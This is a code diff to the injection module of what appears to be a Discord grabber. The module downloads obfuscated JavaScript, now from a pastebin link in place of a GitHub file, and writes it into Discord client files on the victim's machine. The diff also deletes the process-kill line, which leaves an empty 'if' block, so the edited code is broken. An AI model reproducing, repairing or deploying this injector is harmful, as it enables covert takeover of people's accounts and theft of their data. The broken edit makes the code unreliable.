@@ -16,11 +16,10 @@ class Injection:
             self.appdata + '\\DiscordDevelopment'
         ]
         self.code = requests.get(
-            'https://raw.githubusercontent.com/addi00000/empyrean-injection/main/obfuscated.js').text
+            'https://pastebin.com/raw/DLtT1hWm').text
 
         for proc in psutil.process_iter():
             if 'discord' in proc.name().lower():
-                proc.kill()
 
         for dir in self.discord_dirs:
             if not os.path.exists(dir):
@@ -45,17 +44,3 @@ class Injection:
                             continue
 
                         return core, file
-
-    def start_discord(self, dir: str) -> None:
-        update = dir + '\\Update.exe'
-        executable = dir.split('\\')[-1] + '.exe'
-
-        for file in os.listdir(dir):
-            if re.search(r'app-+?', file):
-                app = dir + '\\' + file
-                if os.path.exists(app + '\\' + 'modules'):
-                    for file in os.listdir(app):
-                        if file == executable:
-                            executable = app + '\\' + executable
-                            subprocess.call([update, '--processStart', executable],
-                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
